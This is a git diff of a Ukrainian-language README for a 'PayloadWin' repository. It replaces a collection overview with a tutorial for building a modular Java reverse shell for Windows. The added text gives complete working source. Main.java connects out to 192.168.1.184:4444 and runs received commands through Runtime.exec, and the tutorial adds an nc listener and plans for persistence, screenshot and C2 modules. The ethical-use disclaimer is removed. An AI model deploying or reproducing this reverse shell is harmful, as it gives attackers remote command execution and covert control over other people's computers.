@@ -1,59 +1,179 @@
-# PayloadWin
+# 🛠 PayloadWin — Java Reverse Shell (модульна архітектура)
 
-⚔️ **Колекція користувацьких пейлоадів для Windows**, розроблених у рамках лабораторних досліджень з етичного хакингу, експлуатації, постексплуатації та обходу захисту.
+## 🎯 Мета проєкту
 
-> 🔐 Для навчальних і дослідницьких цілей у ізольованому середовищі.
+Створити масштабований reverse shell для Windows на Java з модульною архітектурою, що дозволяє:
+- запускати системні команди (`exec`)
+- додавати нові модулі (post-exploitation: download, screenshot, persist)
+- структурувати код за принципами Command Pattern
+- підготувати фундамент для майбутніх C2-інструментів
 
----
+## 📁 Структура проєкту
 
-## 🎯 Цілі
-
-- Розробка кастомних пейлоадів (reverse shell, bind shell, beacon тощо)
-- Тестування виявлення AV/EDR (Antivirus / Endpoint Detection & Response)
-- Обхід AMSI, UAC, Defender
-- Підготовка до сертифікацій (OSCP, CRTO, PNPT)
-- Поглиблене розуміння внутрішніх механізмів атак
-
----
-
-## 📁 Структура
+```
 PayloadWin/
-├── reverse_shell/ # Класичні reverse shell на Java / C#
-├── bind_shell/ # Локальні bind shell для вхідного підключення
-├── staged_payloads/ # Пейлоади з кількох етапів (stager → loader)
-├── obfuscated/ # Пейлоади з обфускацією (XOR, Base64, String Encryption)
-├── evasion/ # Техніки обходу EDR/AV: AMSI Bypass, DLL Injection, UAC
-├── powershell/ # PowerShell-скрипти та payload'и
-├── shellcode_loaders/ # Завантажувачі шеллкодів (C/C++, Java, .NET)
-├── persistence/ # Техніки закріплення в системі
-├── beacon/ # Симуляція C2-зʼєднань (на кшталт Cobalt Strike)
+├── reverse_shell/
+│   ├── Main.java                 # Точка входу
+│   ├── Dispatcher.java           # Маршрутизація команд
+│   ├── CommandHandler.java       # Інтерфейс модулів
+│   └── modules/
+│       └── ShellCommand.java     # Модуль виконання команд
+├── .gitignore
 └── README.md
+```
 
+## ⚙️ Кроки створення
 
----
+### 🔹 Крок 1. Ініціалізація
 
-## 🛠️ Використані технології
+```bash
+mkdir PayloadWin && cd PayloadWin
+git init
+gh repo create PayloadWin --public --source=. --remote=origin --push
+```
 
-- Java, PowerShell, C#, Batch
-- Netcat, Metasploit, msfvenom
-- IntelliJ IDEA
-- GitHub CLI (`gh`)
-- Kali Linux, Windows 10 VM
+### 🔹 Крок 2. Створення інтерфейсу `CommandHandler`
 
----
+`reverse_shell/CommandHandler.java`
 
-## ⚠️ Застереження
+```java
+package reverse_shell;
 
-> Всі приклади призначені **виключно для навчання в контрольованому середовищі** (віртуальні машини, приватна лабораторія).  
-> **Заборонено** використання цього коду проти реальних систем без дозволу.  
-> Автор не несе відповідальності за неправомірне використання.
+import java.net.Socket;
 
----
+public interface CommandHandler {
+    void handle(String[] args, Socket socket) throws Exception;
+}
+```
 
-## 📌 Автор
+### 🔹 Крок 3. Створення Dispatcher
 
-- **schemchuk** aka `woshe@kali`
-- Linux-ентузіаст, дослідник безпеки, практик пентесту
-- [GitHub профіль](https://github.com/schemchuk)
+`reverse_shell/Dispatcher.java`
 
+```java
+package reverse_shell;
 
+import java.net.Socket;
+import java.util.HashMap;
+import java.util.Map;
+import reverse_shell.modules.ShellCommand;
+
+public class Dispatcher {
+    private Map<String, CommandHandler> commands = new HashMap<>();
+
+    public Dispatcher() {
+        commands.put("exec", new ShellCommand());
+    }
+
+    public void dispatch(String input, Socket socket) throws Exception {
+        String[] parts = input.trim().split(" ", 2);
+        String cmd = parts[0];
+        String[] args = (parts.length > 1) ? parts[1].split(" ") : new String[0];
+
+        CommandHandler handler = commands.get(cmd);
+        if (handler != null) {
+            handler.handle(args, socket);
+        } else {
+            socket.getOutputStream().write(("Unknown command: " + cmd + "\n").getBytes());
+        }
+    }
+}
+```
+
+### 🔹 Крок 4. Модуль виконання команд
+
+`reverse_shell/modules/ShellCommand.java`
+
+```java
+package reverse_shell.modules;
+
+import reverse_shell.CommandHandler;
+import java.io.*;
+import java.net.Socket;
+
+public class ShellCommand implements CommandHandler {
+    @Override
+    public void handle(String[] args, Socket socket) throws Exception {
+        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
+        String command = String.join(" ", args);
+
+        Process process = Runtime.getRuntime().exec(command);
+        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+        BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
+
+        String line;
+        while ((line = reader.readLine()) != null) out.println(line);
+        while ((line = errorReader.readLine()) != null) out.println(line);
+
+        process.waitFor();
+    }
+}
+```
+
+### 🔹 Крок 5. Основний клас
+
+`reverse_shell/Main.java`
+
+```java
+package reverse_shell;
+
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.net.Socket;
+
+public class Main {
+    public static void main(String[] args) {
+        String host = "192.168.1.184"; // ← Вказати свою IP
+        int port = 4444;
+
+        try {
+            Socket socket = new Socket(host, port);
+            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
+            Dispatcher dispatcher = new Dispatcher();
+
+            String input;
+            while ((input = reader.readLine()) != null) {
+                dispatcher.dispatch(input, socket);
+            }
+
+            socket.close();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+```
+
+## 🧪 Тестування
+
+### 1. Слухати з боку атакуючого:
+
+```bash
+nc -lvnp 4444
+```
+
+### 2. Компілювати:
+
+```bash
+javac reverse_shell/*.java reverse_shell/modules/*.java
+```
+
+### 3. Запустити:
+
+```bash
+java reverse_shell.Main
+```
+
+### 4. Надіслати в nc:
+
+```
+exec whoami
+```
+
+## ✅ Далі
+
+- [ ] Додати модуль `download`
+- [ ] Додати `screenshot`
+- [ ] Додати `persist`
+- [ ] Серіалізувати комунікацію (JSON/протокол)
+- [ ] C2-архітектура / reconnect
